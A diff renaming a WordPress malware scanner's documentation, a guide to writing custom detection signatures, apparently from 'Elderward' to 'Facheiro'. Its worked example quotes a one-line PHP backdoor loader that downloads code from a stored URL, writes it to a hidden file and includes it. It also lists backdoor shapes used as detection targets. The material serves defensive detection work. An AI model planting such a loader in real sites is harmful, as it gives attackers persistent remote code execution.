@@ -1,10 +1,10 @@
-# Writing malware signatures for Elderward
+# Writing malware signatures for Facheiro
 
-Elderward ships with built-in signatures for known malware campaigns. When you find something they miss — a backdoor planted on this site, a new injection, a spam campaign in the database — you can write your own **custom signature** so every later scan looks for it too, on this site and on any other site you import it into.
+Facheiro ships with built-in signatures for known malware campaigns. When you find something they miss — a backdoor planted on this site, a new injection, a spam campaign in the database — you can write your own **custom signature** so every later scan looks for it too, on this site and on any other site you import it into.
 
 This guide covers what a signature can see, how to write one that catches the threat without flagging clean code, how to test it, and how to share it. You need no programming beyond reading the malicious sample and, for the stronger rules, a little regular-expression syntax.
 
-> **Custom signatures only detect.** A match is reported as a finding; nothing is ever cleaned, rewritten or deleted because of a custom signature — not on the admin page, not in a real `wp elderward scan` run. Cleanup stays with the built-in signatures and with you.
+> **Custom signatures only detect.** A match is reported as a finding; nothing is ever cleaned, rewritten or deleted because of a custom signature — not on the admin page, not in a real `wp facheiro scan` run. Cleanup stays with the built-in signatures and with you.
 
 **Contents**
 
@@ -39,7 +39,7 @@ Say the scan found `wp-content/uploads/2026/04/cache.php`, and the file starts l
 <?php /* acme_loader 2.1 */ $c = @file_get_contents(get_option('acme_cdn')); @file_put_contents(__DIR__ . '/.cache.php', $c); @include __DIR__ . '/.cache.php';
 ```
 
-1. Go to **Elderward > Signatures** and fill in **Add a signature**:
+1. Go to **Facheiro > Signatures** and fill in **Add a signature**:
    - **Name:** `acme-loader`
    - **Looks in:** Files
    - **Severity:** HIGH
@@ -59,7 +59,7 @@ HIGH,SIGNATURE_MATCH,…/cache.php,custom.acme-loader: ACME loader backdoor (cus
 
 That is the whole loop: sample → conditions → try on the bad file and a good file → save → scan.
 
-Why this sample: Elderward's **built-in detection** already reports the generic backdoor shapes on its own, as `MALWARE_FOUND` (code or commands taken from the request, `eval` of `base64_decode` output, password-gated shells, known shell families, PHP behind an image header, and more; the Signatures tab lists them). This loader reads no request input and decodes nothing, so it slips past them. That is where a custom signature earns its place: code the built-ins miss, and a family you want named in the findings.
+Why this sample: Facheiro's **built-in detection** already reports the generic backdoor shapes on its own, as `MALWARE_FOUND` (code or commands taken from the request, `eval` of `base64_decode` output, password-gated shells, known shell families, PHP behind an image header, and more; the Signatures tab lists them). This loader reads no request input and decodes nothing, so it slips past them. That is where a custom signature earns its place: code the built-ins miss, and a family you want named in the findings.
 
 ## 3. What a signature is made of
 
@@ -79,7 +79,7 @@ Up to 200 custom signatures per site. Changes apply from the **next** scan.
 
 ### Files (`file`)
 
-- **Which files:** files under the WordPress folder whose extension is one of `php`, `php3`–`php8`, `phtml`, `pht`, `phps`, `inc`, `js`, `css`, `htm`, `html`, `shtml`, `tpl`, `tmpl`, `asp`, `aspx`, `asa`, `cfm`, `cgi`, `pl`, `py`, `sh`, `conf`, `cron`, `local`, `mod`, `sct`, `ejl`, `cin`, `izo`. The Elderward plugin folder itself is never scanned (its own signature strings would match).
+- **Which files:** files under the WordPress folder whose extension is one of `php`, `php3`–`php8`, `phtml`, `pht`, `phps`, `inc`, `js`, `css`, `htm`, `html`, `shtml`, `tpl`, `tmpl`, `asp`, `aspx`, `asa`, `cfm`, `cgi`, `pl`, `py`, `sh`, `conf`, `cron`, `local`, `mod`, `sct`, `ejl`, `cin`, `izo`. The Facheiro plugin folder itself is never scanned (its own signature strings would match).
 - **Size:** files over **2 MB** are not read. Each one is reported as `FILE_TOO_LARGE` instead (`ERROR` for PHP, `INFO` otherwise), so you can see what was not checked.
 - **Content:** the whole file as raw bytes. Nothing is decoded first: a rule sees `eval(base64_decode(...))` as written, not what the base64 contains. (The built-in detection set gets a second look at files nothing matched, with comments removed, `'ev'.'al'`-style fragments joined and letter escapes decoded; custom signatures always see the raw bytes.)
 - **One finding per file:** signatures are tried in order, built-in first (the cleanup signatures, then the built-in detection set), and the **first one that matches wins**. If a built-in signature already catches a file, your custom one does not report it again. Built-in detection goes first on purpose: a custom rule, even a mistaken one, can never re-label a file the built-ins call HIGH.
@@ -88,7 +88,7 @@ Up to 200 custom signatures per site. Changes apply from the **next** scan.
 
 ### Database options (`db_option`)
 
-- **Which values:** every row of the options table, the first **256 KB** of each value, as stored (serialized PHP stays serialized; Elderward never unserializes it). On a multisite network that is the options table of every site (`db:wp_3_options:<option name>`) and the network's own settings (`db:wp_sitemeta:<name>`).
+- **Which values:** every row of the options table, the first **256 KB** of each value, as stored (serialized PHP stays serialized; Facheiro never unserializes it). On a multisite network that is the options table of every site (`db:wp_3_options:<option name>`) and the network's own settings (`db:wp_sitemeta:<name>`).
 - **Not covered by custom signatures:** `siteurl`, `home`, `active_plugins` and the `…user_roles` option, and on a network `site_admins` and `active_sitewide_plugins`. They have dedicated checks (`DB_SITE_URL`, `DB_ACTIVE_PLUGIN`, `DB_ROLE_CAPS`, `DB_SUPER_ADMIN`).
 - **Finding:** `DB_OPTION_IOC` at `db:<options table>:<option name>`, with an excerpt of about 200 characters around the match. One finding per option; built-in signatures are tried first.
 - Good for: injected `<script>` tags in widget or theme options, spam links in text widgets, cron-like options storing code.
@@ -227,7 +227,7 @@ Every signature needs two tests before it goes into a scan: it **must match** th
 
 ### In the admin
 
-**Elderward > Signatures > Try signatures** runs the built-in and custom signatures against:
+**Facheiro > Signatures > Try signatures** runs the built-in and custom signatures against:
 
 - **A file on this site**: a path from the WordPress folder, such as `wp-content/plugins/acme/loader.php` (not `wp-config.php`, and at most 2 MB), or
 - **A pasted sample**: any text.
@@ -245,21 +245,21 @@ Good negative tests:
 The strongest negative test: scan a fresh WordPress (plus the plugins and theme the site uses) with only your signatures and expect no `SIGNATURE_MATCH`:
 
 ```
-php wp-content/plugins/elderward/bin/elderward.php dryrun=1 signatures=my-signatures.json scandirectory=/path/to/clean-wordpress
+php wp-content/plugins/facheiro/bin/facheiro.php dryrun=1 signatures=my-signatures.json scandirectory=/path/to/clean-wordpress
 ```
 
 Then the site itself, report-only:
 
 ```
-php wp-content/plugins/elderward/bin/elderward.php dryrun=1 signatures=my-signatures.json scandirectory=/path/to/site
-php wp-content/plugins/elderward/bin/elderward.php dryrun=1 allfiles=1 signatures=my-signatures.json scandirectory=/path/to/site   # every extension
+php wp-content/plugins/facheiro/bin/facheiro.php dryrun=1 signatures=my-signatures.json scandirectory=/path/to/site
+php wp-content/plugins/facheiro/bin/facheiro.php dryrun=1 allfiles=1 signatures=my-signatures.json scandirectory=/path/to/site   # every extension
 ```
 
 `dryrun=1` keeps the run report-only. Custom signatures never clean anyway, but the same run also applies the built-in cleanup signatures, which do.
 
 ### After saving
 
-Start a scan from **Elderward > Scan**. If your rule finds more than you expected, switch it off (**Disable**) while you look at the extra findings, rather than marking them all as false positives.
+Start a scan from **Facheiro > Scan**. If your rule finds more than you expected, switch it off (**Disable**) while you look at the extra findings, rather than marking them all as false positives.
 
 ## 8. Severity and description
 
@@ -275,15 +275,15 @@ The **description** is what the person reading the report sees. Write what was f
 
 ## 9. Sharing signatures
 
-- **Export:** **Import and export > Export custom signatures** downloads `elderward-signatures-<date>.json` with all your signatures, enabled or not.
+- **Export:** **Import and export > Export custom signatures** downloads `facheiro-signatures-<date>.json` with all your signatures, enabled or not.
 - **Import:** paste a file's content under **Import**. Signatures with the same name are replaced, new ones added. If any entry is invalid, **nothing** is imported and the message names the entry.
-- **Command line:** the same file works with the standalone scanner: `php bin/elderward.php scanall=1 signatures=file.json scandirectory=/path`.
+- **Command line:** the same file works with the standalone scanner: `php bin/facheiro.php scanall=1 signatures=file.json scandirectory=/path`.
 
 The format:
 
 ```json
 {
-  "elderward_signatures": 1,
+  "facheiro_signatures": 1,
   "signatures": [
     {
       "id": "acme-loader",
@@ -311,9 +311,9 @@ Keep a team set in version control, review changes like code, and import it on e
 
 ## 10. Writing signatures with an AI assistant
 
-With the AI assistant tools set up (**Elderward > AI assistants**), an assistant can draft and test signatures through `elderward/test-signature` and save them with `elderward/save-signature`:
+With the AI assistant tools set up (**Facheiro > AI assistants**), an assistant can draft and test signatures through `facheiro/test-signature` and save them with `facheiro/save-signature`:
 
-> "Elderward missed a backdoor in `wp-content/uploads/2026/04/cache.php`. Read it, write a signature for it, try it on that file and on `wp-includes/functions.php`, and show me the result before saving."
+> "Facheiro missed a backdoor in `wp-content/uploads/2026/04/cache.php`. Read it, write a signature for it, try it on that file and on `wp-includes/functions.php`, and show me the result before saving."
 
 Treat the assistant like a junior colleague:
 
